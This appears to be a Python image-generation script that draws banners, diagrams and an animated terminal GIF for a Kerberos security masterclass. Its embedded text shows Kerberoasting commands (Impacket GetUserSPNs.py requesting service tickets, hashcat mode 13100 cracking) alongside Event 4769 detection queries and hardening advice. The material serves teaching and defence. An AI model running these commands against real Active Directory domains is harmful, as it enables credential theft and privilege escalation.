#!/usr/bin/env python3
"""
Generate Visual Media Assets for Kerberos Masterclass
- Hero Banner (1200x500)
- Protocol Architecture Infographic (1200x700)
- Attack & Defense Infographic (1200x700)
- Animated Terminal Walkthrough GIF (920x520)
"""

import os
from PIL import Image, ImageDraw, ImageFont

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
IMAGES_DIR = os.path.join(BASE_DIR, "images")
os.makedirs(IMAGES_DIR, exist_ok=True)

# Fonts
font_huge = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 42)
font_title = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 26)
font_subtitle = ImageFont.truetype("C:/Windows/Fonts/seguisb.ttf", 18)
font_body = ImageFont.truetype("C:/Windows/Fonts/segoeui.ttf", 15)
font_mono = ImageFont.truetype("C:/Windows/Fonts/consola.ttf", 14)
font_mono_bold = ImageFont.truetype("C:/Windows/Fonts/consolab.ttf", 15)
font_badge = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 12)

def draw_window_frame(draw, width, height, title_text, badge_text="", fill_color=(15, 23, 42)):
    draw.rectangle([(0, 0), (width, height)], fill=fill_color)
    draw.rectangle([(0, 0), (width, 42)], fill=(30, 41, 59))
    draw.line([(0, 42), (width, 42)], fill=(51, 65, 85), width=2)
    # macOS window buttons
    draw.ellipse([(14, 14), (26, 26)], fill=(239, 68, 68))
    draw.ellipse([(34, 14), (46, 26)], fill=(245, 158, 11))
    draw.ellipse([(54, 14), (66, 26)], fill=(16, 185, 129))
    draw.text((80, 11), title_text, fill=(226, 232, 240), font=font_title)
    if badge_text:
        badge_w = len(badge_text) * 8 + 18
        bx1 = width - badge_w - 16
        bx2 = width - 16
        draw.rounded_rectangle([(bx1, 10), (bx2, 32)], radius=5, fill=(37, 99, 235))
        draw.text((bx1 + 9, 13), badge_text, fill=(255, 255, 255), font=font_badge)

def generate_hero_banner():
    w, h = 1200, 500
    img = Image.new("RGB", (w, h), color=(10, 15, 30))
    draw = ImageDraw.Draw(img)

    # Gradient background accent lines
    for i in range(0, w, 40):
        draw.line([(i, 0), (i + 200, h)], fill=(20, 30, 60), width=1)

    # Center card
    draw.rounded_rectangle([(40, 35), (w - 40, h - 35)], radius=16, fill=(15, 23, 42), outline=(59, 130, 246), width=2)

    # Top pills / badges
    pills = [
        ("RFC 4120 PROTOCOL", (37, 99, 235)),
        ("ACTIVE DIRECTORY", (16, 185, 129)),
        ("MITRE ATT&CK T1558", (239, 68, 68)),
        ("EVENT ID 4769 TELEMETRY", (168, 85, 247)),
    ]
    cur_x = 70
    for text, color in pills:
        pw = len(text) * 8 + 24
        draw.rounded_rectangle([(cur_x, 60), (cur_x + pw, 88)], radius=6, fill=color)
        draw.text((cur_x + 12, 65), text, fill=(255, 255, 255), font=font_badge)
        cur_x += pw + 16

    # Main title
    draw.text((70, 110), "KERBEROS PROTOCOL MASTERCLASS", fill=(248, 250, 252), font=font_huge)
    draw.text((70, 165), "Deep Protocol Engineering, Attack Operations & SOC Detection Architecture", fill=(56, 189, 248), font=font_title)

    # Description
    desc_lines = [
        "Master the foundation of Windows Active Directory identity security: AS-REQ/REP, TGS-REQ/REP, AP-REQ/REP,",
        "Ticket Granting Tickets (TGT), Service Principal Names (SPNs), Kerberoasting (T1558.003), AS-REP Roasting (T1558.004),",
        "Rubeus, Impacket, Kerbrute, Hashcat, Event ID 4768/4769/4771 SIEM hunting, and gMSA hardening."
    ]
    for idx, l in enumerate(desc_lines):
        draw.text((70, 215 + (idx * 24)), l, fill=(203, 213, 225), font=font_body)

    # Bottom 4 metric blocks
    boxes = [
        ("PROTOCOL ENGINE", "RFC 4120 / V5", "AS-REQ -> TGS-REQ -> AP-REQ", (30, 41, 59)),
        ("OFFENSIVE AUDITING", "Kerberoast / AS-REP", "Rubeus • Impacket • Hashcat", (30, 41, 59)),
        ("TELEMETRY & SOC", "Event 4768 / 4769 / 4771", "Splunk SPL • Sigma Hunting", (30, 41, 59)),
        ("DEFENSE IN DEPTH", "AES256 & gMSA", "Least Privilege & Tiering", (30, 41, 59)),
    ]
    bw = (w - 140 - (3 * 20)) // 4
    for i, (b_title, b_val, b_sub, b_bg) in enumerate(boxes):
        bx = 70 + i * (bw + 20)
        by = 310
        draw.rounded_rectangle([(bx, by), (bx + bw, by + 120)], radius=10, fill=b_bg, outline=(51, 65, 85), width=1)
        draw.text((bx + 16, by + 16), b_title, fill=(148, 163, 184), font=font_badge)
        draw.text((bx + 16, by + 40), b_val, fill=(255, 255, 255), font=font_subtitle)
        draw.text((bx + 16, by + 75), b_sub, fill=(56, 189, 248), font=font_body)

    banner_path = os.path.join(IMAGES_DIR, "kerberos_hero_banner.jpg")
    img.save(banner_path, "JPEG", quality=95)
    print(f"Saved: {banner_path}")

def generate_auth_flow_diagram():
    w, h = 1200, 700
    img = Image.new("RGB", (w, h), color=(15, 23, 42))
    draw = ImageDraw.Draw(img)

    draw_window_frame(draw, w, h, "KERBEROS V5 PROTOCOL AUTHENTICATION TIMELINE (RFC 4120)", "PROTOCOL ARCHITECTURE")

    # 3 Entity columns: Client, KDC (Domain Controller), Service (File / Web Server)
    col_client = 180
    col_kdc = 600
    col_svc = 1020

    # Draw vertical entity lifelines
    draw.line([(col_client, 120), (col_client, 640)], fill=(71, 85, 105), width=2)
    draw.line([(col_kdc, 120), (col_kdc, 640)], fill=(71, 85, 105), width=2)
    draw.line([(col_svc, 120), (col_svc, 640)], fill=(71, 85, 105), width=2)

    # Entity header cards
    entities = [
        (col_client, "CLIENT WORKSTATION", "Alice-PC (alice@DOMAIN.LOCAL)", (37, 99, 235)),
        (col_kdc, "KEY DISTRIBUTION CENTER", "DC01 (KDC / AS / TGS / AD DS)", (16, 185, 129)),
        (col_svc, "TARGET SERVICE", "FILE01 (cifs/FILE01.domain.local)", (168, 85, 247))
    ]
    for cx, title, subtitle, col in entities:
        draw.rounded_rectangle([(cx - 140, 60), (cx + 140, 115)], radius=8, fill=(30, 41, 59), outline=col, width=2)
        draw.text((cx - 120, 70), title, fill=(255, 255, 255), font=font_subtitle)
        draw.text((cx - 120, 93), subtitle, fill=(148, 163, 184), font=font_badge)

    # Steps timeline
    steps = [
        (160, col_client, col_kdc, "1. AS-REQ: Request TGT with Pre-Auth (Encrypted Timestamp with User Secret)", (56, 189, 248), True),
        (230, col_kdc, col_client, "2. AS-REP: Validates Secret -> Returns TGT (krbtgt-encrypted) + Logon Session Key", (16, 185, 129), False),
        (320, col_client, col_kdc, "3. TGS-REQ: Present TGT + Request Ticket for SPN (cifs/FILE01.domain.local)", (245, 158, 11), True),
        (390, col_kdc, col_client, "4. TGS-REP: Decrypts TGT -> Issues Service Ticket (encrypted with Service Secret)", (16, 185, 129), False),
        (480, col_client, col_svc, "5. AP-REQ: Client presents Service Ticket + Authenticator directly to FILE01", (239, 68, 68), True),
        (550, col_svc, col_client, "6. AP-REP (Optional): Mutual Authentication -> Confirms Server Authenticity", (168, 85, 247), False),
    ]

    for y, x1, x2, label, col, to_right in steps:
        draw.line([(x1, y), (x2, y)], fill=col, width=3)
        # Arrowhead
        if to_right:
            draw.polygon([(x2, y), (x2 - 12, y - 6), (x2 - 12, y + 6)], fill=col)
            draw.text(((x1 + x2) // 2 - 250, y - 22), label, fill=col, font=font_mono_bold)
        else:
            draw.polygon([(x2, y), (x2 + 12, y - 6), (x2 + 12, y + 6)], fill=col)
            draw.text(((x1 + x2) // 2 - 250, y - 22), label, fill=col, font=font_mono_bold)

    # Key Takeaway Box at bottom
    draw.rounded_rectangle([(50, 615), (w - 50, 680)], radius=8, fill=(30, 41, 59), outline=(59, 130, 246), width=1)
    draw.text((70, 625), "CRITICAL ARCHITECTURAL PROPERTY:", fill=(56, 189, 248), font=font_mono_bold)
    draw.text((70, 648), "Target services never receive user passwords. Service Tickets are encrypted with the Service Account password hash (SPN).", fill=(226, 232, 240), font=font_body)

    out_path = os.path.join(IMAGES_DIR, "kerberos_auth_flow.jpg")
    img.save(out_path, "JPEG", quality=95)
    print(f"Saved: {out_path}")

def generate_attack_flow_diagram():
    w, h = 1200, 700
    img = Image.new("RGB", (w, h), color=(15, 23, 42))
    draw = ImageDraw.Draw(img)

    draw_window_frame(draw, w, h, "KERBEROASTING ATTACK & DEFENSE ARCHITECTURE (MITRE ATT&CK T1558.003)", "SECURITY ARCHITECTURE")

    # 4 Stage Cards across top
    stages = [
        ("STAGE 1: DISCOVERY", "Active Directory Recon", "Find User Accounts with SPNs\nGetUserSPNs.py / Rubeus / LDAP\nFilter: (servicePrincipalName=*)", (37, 99, 235)),
        ("STAGE 2: EXTRACTION", "TGS Ticket Request", "Valid User Requests Service Ticket\nDC creates TGS encrypted with\nService Account Password Hash", (245, 158, 11)),
        ("STAGE 3: OFFLINE AUDIT", "Cryptanalytic Attack", "Zero Interaction with DC\nHashcat Mode 13100 (RC4) / 19600\nJohn the Ripper (krb5tgs)", (239, 68, 68)),
        ("STAGE 4: LATERAL ESC", "Identity Abuse", "Cracked Plaintext Password\nPrivEsc to Backup / Domain Admin\nPersistence via Golden/Silver Tickets", (168, 85, 247)),
    ]
    card_w = (w - 100 - (3 * 20)) // 4
    for idx, (st_t, st_sub, st_desc, st_col) in enumerate(stages):
        cx = 50 + idx * (card_w + 20)
        cy = 70
        draw.rounded_rectangle([(cx, cy), (cx + card_w, cy + 220)], radius=10, fill=(30, 41, 59), outline=st_col, width=2)
        draw.text((cx + 14, cy + 14), st_t, fill=st_col, font=font_subtitle)
        draw.text((cx + 14, cy + 42), st_sub, fill=(255, 255, 255), font=font_mono_bold)
        draw.line([(cx + 14, cy + 68), (cx + card_w - 14, cy + 68)], fill=(51, 65, 85), width=1)
        for d_idx, d_line in enumerate(st_desc.split("\n")):
            draw.text((cx + 14, cy + 80 + (d_idx * 24)), d_line, fill=(203, 213, 225), font=font_body)

    # Middle Section: Detection Engineering (Event 4769)
    draw.rounded_rectangle([(50, 315), (w - 50, 485)], radius=10, fill=(19, 30, 49), outline=(56, 189, 248), width=2)
    draw.text((70, 328), "🛡️ BLUE TEAM TELEMETRY & SIEM DETECTION ENGINE (WINDOWS SECURITY LOG)", fill=(56, 189, 248), font=font_title)

    det_bullets = [
        "Event ID 4769: A Kerberos service ticket was requested (Audit Kerberos Service Ticket Operations enabled on DC).",
        "Anomalous Volume: Rapid burst of Event 4769 requests for multiple distinct SPNs from a single workstation within seconds.",
        "Encryption Downgrade: Ticket_Encryption_Type = 0x17 (RC4-HMAC-MD5) requested by a modern Windows 10/11 client.",
        "Service Account Targeting: Ticket requests where TargetUserName is a high-privilege service account (AdminCount=1)."
    ]
    for b_idx, b_text in enumerate(det_bullets):
        draw.text((70, 370 + (b_idx * 26)), f"•  {b_text}", fill=(226, 232, 240), font=font_body)

    # Bottom Section: Defensive Remediation Checklist
    draw.rounded_rectangle([(50, 505), (w - 50, 675)], radius=10, fill=(16, 35, 28), outline=(16, 185, 129), width=2)
    draw.text((70, 518), "🔒 ENTERPRISE DEFENSIVE REMEDIATION BLUEPRINT", fill=(16, 185, 129), font=font_title)

    rem_bullets = [
        "Group Managed Service Accounts (gMSA): 120+ character automatically-rotated passwords, rendering offline cracking mathematically impossible.",
        "AES-Only Kerberos Encryption: Enforce AES128/AES256 (0x12/0x11) for service accounts; disable RC4 in domain functional levels.",
        "Least Privilege Architecture: Strip domain-level admin privileges from service accounts; isolate service tiers (Tier 0, 1, 2).",
        "Continuous Splunk / EDR Auditing: Hunt for unconstrained delegation, accounts with pre-auth disabled (DONT_REQ_PREAUTH), and SPN changes."
    ]
    for r_idx, r_text in enumerate(rem_bullets):
        draw.text((70, 558 + (r_idx * 26)), f"✓  {r_text}", fill=(209, 250, 229), font=font_body)

    out_path = os.path.join(IMAGES_DIR, "kerberoasting_attack_flow.jpg")
    img.save(out_path, "JPEG", quality=95)
    print(f"Saved: {out_path}")

def generate_live_terminal_gif():
    w, h = 920, 520

    frames_data = [
        ("KALI LINUX • ENUMERATING DOMAIN SPNs VIA IMPACKET",
         "STEP 1/4: RECONNAISSANCE",
         [
             ("attacker@kali:~$ ", (56, 189, 248)),
             ("GetUserSPNs.py corp.local/alice:'LabPass123!' -dc-ip 10.10.10.10\n", (255, 255, 255)),
             ("Impacket v0.12.0 - Copyright Fortra, LLC\n\n", (148, 163, 184)),
             ("[*] Connecting to LDAP server 10.10.10.10:389\n", (56, 189, 248)),
             ("[+] Authenticated as alice@corp.local\n", (16, 185, 129)),
             ("[*] Querying Active Directory for ServicePrincipalNames...\n", (226, 232, 240)),
             ("ServicePrincipalName             Name        MemberOf\n", (245, 158, 11)),
             ("-------------------------------- ----------- ----------------------------\n", (100, 116, 139)),
             ("MSSQLSvc/sql01.corp.local:1433  svc_sql     CN=SQL Admins,OU=Services,DC=corp\n", (226, 232, 240)),
             ("HTTP/web01.corp.local           svc_web     CN=Web Operators,OU=Services\n", (226, 232, 240)),
             ("CIFS/backup01.corp.local        svc_backup  CN=Domain Admins,CN=Users,DC=corp\n\n", (239, 68, 68)),
             ("[+] Discovered 3 Kerberoastable SPN accounts (1 Domain Admin)", (16, 185, 129))
         ]),
        ("KALI LINUX • REQUESTING TGS TICKETS & EXTRACTING TGS-REP HASHES",
         "STEP 2/4: TGS EXTRACTION",
         [
             ("attacker@kali:~$ ", (56, 189, 248)),
             ("GetUserSPNs.py corp.local/alice:'LabPass123!' -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt\n", (255, 255, 255)),
             ("Impacket v0.12.0 - Copyright Fortra, LLC\n\n", (148, 163, 184)),
             ("[*] Requesting TGS ticket for: MSSQLSvc/sql01.corp.local:1433\n", (226, 232, 240)),
             ("[*] Requesting TGS ticket for: HTTP/web01.corp.local\n", (226, 232, 240)),
             ("[*] Requesting TGS ticket for: CIFS/backup01.corp.local\n", (226, 232, 240)),
             ("[+] TGS-REP received: ticket format $krb5tgs$23$*svc_backup... (RC4-HMAC)\n", (16, 185, 129)),
             ("[+] Extracted 3 roastable service ticket hashes to kerberoast.txt\n\n", (56, 189, 248)),
             ("attacker@kali:~$ ", (56, 189, 248)),
             ("head -n 1 kerberoast.txt\n", (255, 255, 255)),
             ("$krb5tgs$23$*svc_backup$corp.local*$CIFS/backup01...$5c3e41a8... [TRUNCATED]", (245, 158, 11))
         ]),
        ("KALI LINUX • OFFLINE PASSWORD RECOVERY VIA HASHCAT (MODE 13100)",
         "STEP 3/4: OFFLINE CRACKING",
         [
             ("attacker@kali:~$ ", (56, 189, 248)),
             ("hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt\n", (255, 255, 255)),
             ("hashcat (v6.2.6) starting in autodetect mode...\n\n", (148, 163, 184)),
             ("OpenCL API (OpenCL 3.0 CUDA 12.2) • Device #1: NVIDIA GeForce RTX 4090\n", (16, 185, 129)),
             ("Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)\n", (56, 189, 248)),
             ("Speed.#1.........: 1,485.2 MH/s (1.485 Billion Hashes/sec)\n", (16, 185, 129)),
             ("Recovered........: 1/3 (33.33%) Digests\n\n", (245, 158, 11)),
             ("$krb5tgs$23$*svc_backup*corp.local:Winter2024!\n\n", (239, 68, 68)),
             ("[+] SUCCESS: Plaintext password cracked: 'Winter2024!' for svc_backup (Domain Admin)", (16, 185, 129))
         ]),
        ("SPLUNK ENTERPRISE SIEM • EVENT 4769 TGS ANOMALY DETECTION ALERT",
         "STEP 4/4: BLUE TEAM DETECTION",
         [
             ("SPLUNK SEARCH: ", (168, 85, 247)),
             ("index=windows EventCode=4769 TicketOptions=0x40810000 TicketEncryptionType=0x17\n", (255, 255, 255)),
             ("             | stats count values(ServiceName) by Account_Name, Client_Address\n\n", (255, 255, 255)),
             ("🚨 ALERT FIRED: Potential Kerberoasting Activity Detected (MITRE T1558.003)\n", (239, 68, 68)),
             ("• Target Domain Controller : DC01.corp.local (10.10.10.10)\n", (226, 232, 240)),
             ("• Requesting Identity      : alice@CORP.LOCAL (WORKSTATION01 / 10.10.10.45)\n", (245, 158, 11)),
             ("• Ticket Encryption Type   : 0x17 (RC4-HMAC-MD5) -> ANOMALY ON WIN11 HOST\n", (239, 68, 68)),
             ("• Targeted SPN Accounts    : MSSQLSvc/sql01, HTTP/web01, CIFS/backup01\n", (56, 189, 248)),
             ("• TGS Velocity             : 3 requests within 410 milliseconds\n\n", (245, 158, 11)),
             ("[ACTION] Automated SOAR Playbook: Disabling compromised user account 'alice'", (16, 185, 129))
         ])
    ]

    images = []
    for title, badge, lines in frames_data:
        frame_img = Image.new("RGB", (w, h), color=(15, 23, 42))
        draw = ImageDraw.Draw(frame_img)
        draw_window_frame(draw, w, h, title, badge_text=badge)

        # Terminal body
        draw.rounded_rectangle([(20, 55), (w - 20, h - 20)], radius=8, fill=(11, 17, 32), outline=(51, 65, 85), width=2)
        y = 75
        for text, col in lines:
            parts = text.split("\n")
            for idx, part in enumerate(parts):
                if idx > 0:
                    y += 20
                if part:
                    draw.text((36, y), part, fill=col, font=font_mono)
            if text.endswith("\n"):
                y += 4
        images.append(frame_img)

    gif_path = os.path.join(IMAGES_DIR, "kerberos_live_audit_demo.gif")
    images[0].save(
        gif_path,
        save_all=True,
        append_images=images[1:],
        duration=1200,
        loop=0
    )
    print(f"Saved: {gif_path}")

if __name__ == "__main__":
    generate_hero_banner()
    generate_auth_flow_diagram()
    generate_attack_flow_diagram()
    generate_live_terminal_gif()
    print("All media assets generated successfully.")
